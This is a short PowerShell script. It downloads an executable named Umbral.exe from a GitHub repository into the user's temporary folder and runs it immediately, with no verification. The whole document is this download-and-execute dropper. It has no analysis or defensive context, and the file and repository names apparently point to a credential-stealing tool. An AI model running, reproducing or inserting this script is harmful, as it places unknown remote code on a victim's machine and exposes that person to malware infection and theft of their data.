$url = "https://github.com/sigmanip/reallogs123fr/raw/refs/heads/main/Umbral.exe"  
$output = "$env:TEMP\Umbral.exe"  
Invoke-WebRequest -Uri $url -OutFile $output  
Start-Process $output  
